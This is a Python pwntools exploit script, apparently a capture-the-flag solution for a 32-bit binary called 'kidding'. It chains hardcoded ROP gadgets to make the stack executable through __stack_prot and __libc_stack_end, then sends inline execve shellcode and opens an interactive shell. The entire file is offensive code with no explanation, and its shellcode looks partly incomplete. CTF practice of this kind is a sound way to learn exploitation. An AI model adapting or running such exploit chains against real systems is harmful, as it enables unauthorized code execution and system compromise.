#!/usr/bin/python3

from pwn import *

exe = ELF('kidding', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b* 0x0804888f
                b* 0x809a080

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('')
else:
        p = process(exe.path)

GDB()
pop_eax = 0x080b8536
pop_ebx = 0x080481c9
pop_ecx = 0x080583c9
pop_edx = 0x0806ec8b
syscall = 0x080626cd
rw_section = 0x080e9a00
mov_eax_7 = 0x0808eff0
xor = 0x080e00e0
stack = 0x0809A080
call = 0x080c99b0


payload = b'ABCD'
payload += b'EFGH'
payload += p32(exe.sym['__stack_prot']-0xe)
# payload += p32(pop_eax) + p32(0x80e9fc8)
payload += p32(mov_eax_7)
payload += p32(xor)
payload += p32(pop_eax) + p32(exe.sym['__libc_stack_end'])
payload += p32(stack)
payload += p32(call)
payload += asm('''
    xor eax,eax
    add al, 0xb
    int 0x80
    ''')

sl(payload)
p.interactive()
